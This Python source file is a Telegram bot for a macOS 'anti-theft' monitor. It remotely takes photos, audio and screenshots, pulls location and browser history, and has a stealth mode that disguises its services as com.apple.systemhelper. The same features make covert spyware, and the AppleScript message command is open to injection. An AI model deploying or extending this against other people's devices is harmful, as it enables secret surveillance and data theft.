#!/usr/bin/env python3
"""
Telegram Bot for Login Monitor PRO - Fixed Version
"""

import os
import sys
import json
import time
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime


def is_frozen():
    """Check if running as PyInstaller frozen executable"""
    return getattr(sys, 'frozen', False)


def get_base_dir():
    """Get base directory for data files"""
    if is_frozen():
        # When frozen, use ~/.login-monitor for all data
        return Path.home() / ".login-monitor"
    return Path(__file__).parent


SCRIPT_DIR = get_base_dir()
CONFIG_FILE = SCRIPT_DIR / "config.json"
LOG_FILE = SCRIPT_DIR / "telegram_bot.log"

# Add script directory to path for imports
if not is_frozen():
    sys.path.insert(0, str(Path(__file__).parent))


def log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = f"[{timestamp}] {message}"
    print(entry, flush=True)
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(entry + "\n")
    except:
        pass


def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}


class TelegramBot:
    def __init__(self):
        self.config = load_config()
        telegram_config = self.config.get('telegram', {})
        self.bot_token = telegram_config.get('bot_token', '')
        self.chat_id = str(telegram_config.get('chat_id', ''))
        self.last_update_id = 0

        if not self.bot_token:
            log("Error: Telegram bot token not configured")
            sys.exit(1)

        log(f"Bot initialized with chat_id: {self.chat_id}")

    def get_updates(self):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            url += f"?offset={self.last_update_id + 1}&timeout=30"

            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=35)
            data = json.loads(response.read().decode('utf-8'))

            if data.get('ok'):
                return data.get('result', [])
            return []
        except Exception as e:
            log(f"Error getting updates: {e}")
            return []

    def send_message(self, text):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = json.dumps({
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }).encode()

            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=10)
            return True
        except Exception as e:
            log(f"Send message error: {e}")
            return False

    def send_photo(self, photo_path, caption=""):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
            boundary = "----Boundary" + str(int(time.time()))

            with open(photo_path, 'rb') as f:
                photo_data = f.read()

            body = []
            body.append(f'--{boundary}'.encode())
            body.append(b'Content-Disposition: form-data; name="chat_id"')
            body.append(b'')
            body.append(self.chat_id.encode())

            body.append(f'--{boundary}'.encode())
            body.append(b'Content-Disposition: form-data; name="caption"')
            body.append(b'')
            body.append(caption.encode())

            body.append(f'--{boundary}'.encode())
            body.append(f'Content-Disposition: form-data; name="photo"; filename="{os.path.basename(photo_path)}"'.encode())
            body.append(b'Content-Type: image/jpeg')
            body.append(b'')
            body.append(photo_data)

            body.append(f'--{boundary}--'.encode())

            body_bytes = b'\r\n'.join(body)

            req = urllib.request.Request(url, data=body_bytes)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            urllib.request.urlopen(req, timeout=30)
            return True
        except Exception as e:
            log(f"Send photo error: {e}")
            return False

    def send_location(self, lat, lon):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendLocation"
            data = json.dumps({
                "chat_id": self.chat_id,
                "latitude": lat,
                "longitude": lon
            }).encode()

            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=10)
            return True
        except Exception as e:
            log(f"Send location error: {e}")
            return False

    def handle_command(self, command, args, chat_id):
        log(f"Command: {command} | Args: {args} | From: {chat_id}")

        # Verify chat_id
        if str(chat_id) != self.chat_id:
            log(f"Unauthorized chat_id: {chat_id}")
            return

        if command in ["/start", "/help"]:
            self.cmd_help()
        elif command == "/status":
            self.cmd_status()
        elif command == "/photo":
            self.cmd_photo()
        elif command == "/location":
            self.cmd_location()
        elif command == "/alarm":
            duration = int(args) if args and args.isdigit() else 30
            self.cmd_alarm(duration)
        elif command == "/lock":
            self.cmd_lock()
        elif command == "/message":
            self.cmd_message(args if args else "This device is being monitored.")
        elif command == "/audio":
            duration = int(args) if args and args.isdigit() else 10
            self.cmd_audio(duration)
        elif command == "/battery":
            self.cmd_battery()
        elif command == "/wifi":
            self.cmd_wifi()
        elif command == "/ip":
            self.cmd_ip()
        elif command == "/addface":
            self.cmd_addface(args if args else "owner")
        elif command == "/faces":
            self.cmd_faces()
        elif command == "/checkface":
            self.cmd_checkface()
        elif command == "/stealth":
            self.cmd_stealth(args)
        elif command == "/activity":
            self.cmd_activity()
        elif command == "/history":
            self.cmd_browser_history()
        elif command == "/usb":
            self.cmd_usb()
        elif command == "/suspicious":
            self.cmd_suspicious()
        elif command == "/screenshot":
            self.cmd_screenshot()
        else:
            self.send_message(f"Unknown command: {command}\nUse /help for commands.")

    def cmd_help(self):
        self.send_message("""
🤖 <b>Login Monitor PRO Commands</b>

📸 <b>Surveillance:</b>
/photo - Take photo now
/audio [sec] - Record audio
/location - Get GPS location

📊 <b>Status:</b>
/status - Full device status
/battery - Battery level
/wifi - WiFi network
/ip - IP addresses

🚨 <b>Anti-Theft:</b>
/alarm [sec] - Play loud alarm
/lock - Lock screen
/message [text] - Show on screen

👤 <b>Face Recognition:</b>
/addface [name] - Add your face
/faces - List known faces
/checkface - Identify current face

🥷 <b>Stealth:</b>
/stealth [on|off|status] - Toggle stealth mode

📊 <b>Activity Monitor:</b>
/activity - Activity summary
/history - Browser history
/usb - USB devices & transfers
/suspicious - Suspicious activity
/screenshot - Take screenshot now

/help - Show this help
""")

    def cmd_status(self):
        self.send_message("📊 Collecting status...")

        from pro_monitor import SystemInfo
        info = SystemInfo.collect_all()
        battery = info.get('battery', {})
        wifi = info.get('wifi', {})
        location = info.get('location', {})

        status = f"""
📊 <b>DEVICE STATUS</b>

💻 Host: {info['hostname']}
👤 User: {info['user']}
🖥 OS: {info['os']}

🌐 Local IP: {info['local_ip']}
🌍 Public IP: {info['public_ip']}
📶 WiFi: {wifi.get('ssid', 'N/A')}

🔋 Battery: {battery.get('percentage', 'N/A')}%
⚡ Status: {battery.get('status', 'N/A')}

📍 Location: {location.get('city', 'Unknown')}
🗺 {location.get('google_maps', 'N/A')}

⏰ {info['time']}
"""
        self.send_message(status)

        if location.get('latitude'):
            try:
                self.send_location(float(location['latitude']), float(location['longitude']))
            except:
                pass

    def cmd_photo(self):
        self.send_message("📸 Taking photo...")

        from pro_monitor import Capture
        photos = Capture.capture_photos(count=1, delay=0)

        if photos:
            self.send_photo(photos[0], f"📸 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        else:
            self.send_message("❌ Failed to capture photo")

    def cmd_location(self):
        self.send_message("📍 Getting location...")

        from pro_monitor import SystemInfo
        location = SystemInfo.get_location()

        msg = f"""
📍 <b>LOCATION</b>

Lat: {location.get('latitude', 'Unknown')}
Lon: {location.get('longitude', 'Unknown')}
Accuracy: {location.get('accuracy_meters', 'N/A')}
City: {location.get('city', 'N/A')}
Source: {location.get('source', 'Unknown')}

🗺 {location.get('google_maps', 'Unable to determine')}
"""
        self.send_message(msg)

        if location.get('latitude'):
            try:
                self.send_location(float(location['latitude']), float(location['longitude']))
            except:
                pass

    def cmd_alarm(self, duration=30):
        self.send_message(f"🚨 Playing alarm for {duration} seconds!")

        # Play alarm on Mac
        subprocess.Popen([
            "osascript", "-e", 'set volume output volume 100'
        ])

        for i in range(duration):
            subprocess.Popen([
                "afplay", "/System/Library/Sounds/Sosumi.aiff"
            ])
            time.sleep(1)

        self.send_message("✅ Alarm finished")

    def cmd_lock(self):
        self.send_message("🔒 Locking screen...")
        subprocess.run(["pmset", "displaysleepnow"], capture_output=True)
        self.send_message("✅ Screen locked")

    def cmd_message(self, message):
        self.send_message(f"📢 Showing message on screen:\n{message}")

        # Create AppleScript file to avoid quote issues
        script_file = "/tmp/show_msg.scpt"
        with open(script_file, 'w') as f:
            f.write(f'display dialog "{message}" buttons {{"OK"}} default button "OK" with icon caution giving up after 60')

        subprocess.Popen(["osascript", script_file])
        log(f"Message displayed: {message}")

    def cmd_audio(self, duration=10):
        self.send_message(f"🎤 Recording {duration}s audio...")

        from pro_monitor import Capture
        audio_path = Capture.record_audio(duration)

        if audio_path:
            self.send_message(f"✅ Audio recorded: {os.path.basename(audio_path)}")
            # Note: Telegram API for sending audio is more complex, skip for now
        else:
            self.send_message("❌ Failed to record audio")

    def cmd_battery(self):
        from pro_monitor import SystemInfo
        battery = SystemInfo.get_battery_status()

        if battery.get('available'):
            emoji = "🔋" if battery.get('percentage', 0) > 20 else "🪫"
            charge = "⚡ Charging" if battery.get('charging') else "🔌 On Battery"
            self.send_message(f"{emoji} Battery: {battery.get('percentage')}%\n{charge}")
        else:
            self.send_message("❌ Battery info not available")

    def cmd_wifi(self):
        # Use CoreWLAN framework for macOS (more reliable)
        try:
            import objc
            from CoreWLAN import CWWiFiClient

            client = CWWiFiClient.sharedWiFiClient()
            interface = client.interface()

            if interface:
                ssid = interface.ssid()
                bssid = interface.bssid()
                rssi = interface.rssiValue()
                channel = interface.wlanChannel()

                if ssid:
                    msg = f"""📶 <b>WiFi Network</b>

SSID: {ssid}
BSSID: {bssid or 'N/A'}
Signal: {rssi} dBm
Channel: {channel.channelNumber() if channel else 'N/A'}"""
                    self.send_message(msg)
                else:
                    self.send_message("📶 Not connected to WiFi")
            else:
                self.send_message("📶 WiFi interface not found")
        except ImportError:
            # Fallback to networksetup
            try:
                result = subprocess.run(
                    ["networksetup", "-getairportnetwork", "en0"],
                    capture_output=True, text=True, timeout=5
                )
                if "Current Wi-Fi Network" in result.stdout:
                    ssid = result.stdout.split(":")[1].strip()
                    self.send_message(f"📶 <b>WiFi Network:</b> {ssid}")
                else:
                    self.send_message("📶 Not connected to WiFi")
            except Exception as e:
                self.send_message(f"❌ WiFi info error: {e}")
        except Exception as e:
            self.send_message(f"❌ WiFi info error: {e}")

    def cmd_ip(self):
        from pro_monitor import SystemInfo
        local = SystemInfo.get_local_ip()
        public = SystemInfo.get_public_ip()

        self.send_message(f"""
🌐 <b>IP Addresses</b>

Local: {local}
Public: {public}
""")

    def cmd_addface(self, name):
        """Add current face as known"""
        self.send_message(f"📸 Taking photo to add face '{name}'...")

        from pro_monitor import Capture, FaceRecognition, HAS_FACE_RECOGNITION

        if not HAS_FACE_RECOGNITION:
            self.send_message("❌ Face recognition not available. Install with: pip3 install face_recognition")
            return

        photos = Capture.capture_photos(count=1, delay=0)

        if not photos:
            self.send_message("❌ Failed to capture photo")
            return

        try:
            fr = FaceRecognition()
            if fr.add_known_face(photos[0], name):
                self.send_message(f"✅ Face '{name}' added successfully!")
                self.send_photo(photos[0], f"Added as: {name}")
            else:
                self.send_message("❌ No face detected in photo. Try again with better lighting.")
        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_faces(self):
        """List known faces"""
        faces_dir = SCRIPT_DIR / "known_faces"

        if not faces_dir.exists():
            self.send_message("📁 No known faces directory")
            return

        faces = list(faces_dir.glob("*.jpg"))

        if not faces:
            self.send_message("👤 No known faces registered.\n\nUse /addface [name] to add your face.")
            return

        msg = "👥 <b>Known Faces:</b>\n\n"
        for face in faces:
            msg += f"• {face.stem}\n"

        msg += f"\nTotal: {len(faces)} faces"
        self.send_message(msg)

    def cmd_checkface(self):
        """Take photo and identify faces"""
        self.send_message("📸 Taking photo for face check...")

        from pro_monitor import Capture, FaceRecognition, HAS_FACE_RECOGNITION

        if not HAS_FACE_RECOGNITION:
            self.send_message("❌ Face recognition not available")
            return

        photos = Capture.capture_photos(count=1, delay=0)

        if not photos:
            self.send_message("❌ Failed to capture photo")
            return

        try:
            fr = FaceRecognition()
            result = fr.identify(photos[0])

            if not result.get('available'):
                self.send_message(f"❌ {result.get('reason', 'Error')}")
                return

            face_count = result.get('face_count', 0)

            if face_count == 0:
                self.send_message("👤 No faces detected in photo")
                self.send_photo(photos[0], "No faces found")
                return

            msg = f"👥 <b>Face Check Results:</b>\n\n"
            msg += f"Faces found: {face_count}\n\n"

            for i, face in enumerate(result.get('faces', []), 1):
                status = "✅ KNOWN" if face['is_known'] else "⚠️ UNKNOWN"
                msg += f"{i}. {face['name']} - {status}\n"

            if result.get('has_unknown'):
                msg += "\n🚨 <b>WARNING: Unknown face detected!</b>"

            self.send_message(msg)
            self.send_photo(photos[0], f"Detected {face_count} face(s)")

        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_activity(self):
        """Get activity summary"""
        self.send_message("📊 Analyzing activity...")

        try:
            from activity_monitor import ActivityMonitor
            monitor = ActivityMonitor()
            summary = monitor.get_activity_summary(hours=1)

            msg = f"""📊 <b>Activity Summary</b>
(Last {summary['period']})

📁 File accesses: {summary['file_access']}
💾 USB events: {summary['usb_events']}
📱 App switches: {summary['app_switches']}
📋 Clipboard uses: {summary['clipboard_uses']}
📸 Screenshots: {summary['screenshots']}

Total events: {summary['total_events']}"""

            self.send_message(msg)

            # Show last 5 events
            if summary['events']:
                events_msg = "\n<b>Recent Events:</b>\n"
                for e in summary['events'][-5:]:
                    time_str = e['timestamp'].split('T')[1][:8]
                    events_msg += f"• [{time_str}] {e['type']}\n"
                self.send_message(events_msg)

        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_browser_history(self):
        """Get browser history"""
        self.send_message("🌐 Fetching browser history...")

        try:
            from activity_monitor import ActivityMonitor
            monitor = ActivityMonitor()
            history = monitor.browser_monitor.get_all_history(15)

            if not history:
                self.send_message("📭 No browser history found")
                return

            msg = "🌐 <b>Recent Browser History</b>\n\n"
            for h in history[:10]:
                browser = "🧭" if h['browser'] == "Safari" else "🌐"
                title = h['title'][:30] + "..." if len(h['title']) > 30 else h['title']
                time_str = h['time'].split(' ')[1] if ' ' in h['time'] else h['time']
                msg += f"{browser} [{time_str}] {title}\n"

            self.send_message(msg)

        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_usb(self):
        """Get USB device info"""
        self.send_message("💾 Checking USB devices...")

        try:
            from activity_monitor import ActivityMonitor
            monitor = ActivityMonitor()
            volumes = monitor.usb_monitor.get_connected_volumes()

            external = [v for v in volumes if v.get('is_external')]

            if not external:
                self.send_message("💾 No external USB devices connected")
                return

            msg = "💾 <b>Connected USB Devices</b>\n\n"
            for vol in external:
                msg += f"• {vol['name']}\n"
                msg += f"  Path: {vol['path']}\n"
                if vol.get('size'):
                    msg += f"  Size: {vol['size']}\n"
                msg += "\n"

            self.send_message(msg)

            # Check for recent transfers
            transfers = monitor.activity_log.get_by_type("usb_transfer", 5)
            if transfers:
                transfer_msg = "\n<b>Recent USB Transfers:</b>\n"
                for t in transfers:
                    data = t.get('data', {})
                    transfer_msg += f"• {data.get('file', 'Unknown')[:40]}\n"
                self.send_message(transfer_msg)

        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_suspicious(self):
        """Get suspicious activity"""
        self.send_message("🔍 Analyzing suspicious activity...")

        try:
            from activity_monitor import ActivityMonitor
            monitor = ActivityMonitor()
            suspicious = monitor.get_suspicious_activity()

            if not suspicious:
                self.send_message("✅ No suspicious activity detected")
                return

            msg = f"⚠️ <b>Suspicious Activity</b>\n\nFound {len(suspicious)} suspicious events:\n\n"

            for s in suspicious[:10]:
                time_str = s['time'].split('T')[1][:8] if 'T' in s['time'] else s['time']
                details = s['details'][:35] + "..." if len(s['details']) > 35 else s['details']
                msg += f"🚨 [{time_str}]\n"
                msg += f"   {s['reason']}\n"
                msg += f"   {details}\n\n"

            self.send_message(msg)

        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_screenshot(self):
        """Take screenshot now"""
        self.send_message("📸 Taking screenshot...")

        try:
            from activity_monitor import ActivityMonitor
            monitor = ActivityMonitor()
            screenshot = monitor.screenshot_monitor.take_screenshot("telegram_request")

            if screenshot:
                self.send_photo(screenshot, "📸 Screenshot captured")
            else:
                self.send_message("❌ Failed to take screenshot")

        except Exception as e:
            self.send_message(f"❌ Error: {e}")

    def cmd_stealth(self, args):
        """Toggle stealth mode"""
        if is_frozen():
            # When frozen, stealth_setup is in the same MacOS directory
            stealth_script = Path(sys.executable).parent / "stealth_setup"
        else:
            stealth_script = Path(__file__).parent / "stealth_setup.py"

        if not stealth_script.exists():
            self.send_message("❌ Stealth setup script not found")
            return

        args = args.lower().strip() if args else "status"

        if args == "on":
            self.send_message("🥷 Enabling stealth mode...")
            if is_frozen():
                cmd = [str(stealth_script), "enable"]
            else:
                cmd = ["python3", str(stealth_script), "enable"]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                self.send_message("✅ Stealth mode enabled!\n\n• Services renamed to com.apple.systemhelper.*\n• Directory: ~/.system_helper\n• Logs: /tmp/systemhelper-*.log")
            else:
                self.send_message(f"❌ Error: {result.stderr}")

        elif args == "off":
            self.send_message("🔓 Disabling stealth mode...")
            if is_frozen():
                cmd = [str(stealth_script), "disable"]
            else:
                cmd = ["python3", str(stealth_script), "disable"]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                self.send_message("✅ Stealth mode disabled!\n\n• Services: com.loginmonitor.*\n• Directory: ~/.login-monitor")
            else:
                self.send_message(f"❌ Error: {result.stderr}")

        else:  # status
            stealth_dir = Path.home() / ".system_helper"
            normal_dir = Path.home() / ".login-monitor"

            if stealth_dir.exists():
                self.send_message("🥷 <b>Stealth Mode: ENABLED</b>\n\n• Directory: ~/.system_helper\n• Services: com.apple.systemhelper.*")
            elif normal_dir.exists():
                self.send_message("🔓 <b>Stealth Mode: DISABLED</b>\n\n• Directory: ~/.login-monitor\n• Services: com.loginmonitor.*")
            else:
                self.send_message("❓ Login Monitor not installed")

    def run(self):
        log("Telegram bot started - listening for commands...")
        self.send_message("🤖 Login Monitor Bot is online!\n\nSend /help for commands.")

        while True:
            try:
                updates = self.get_updates()

                for update in updates:
                    self.last_update_id = update['update_id']

                    message = update.get('message', {})
                    text = message.get('text', '')
                    chat_id = message.get('chat', {}).get('id')

                    if text.startswith('/'):
                        parts = text.split(' ', 1)
                        command = parts[0].lower().split('@')[0]  # Handle @botname suffix
                        args = parts[1] if len(parts) > 1 else ""
                        self.handle_command(command, args, chat_id)

                time.sleep(1)

            except KeyboardInterrupt:
                log("Bot stopped")
                break
            except Exception as e:
                log(f"Error: {e}")
                time.sleep(5)


if __name__ == "__main__":
    bot = TelegramBot()
    bot.run()
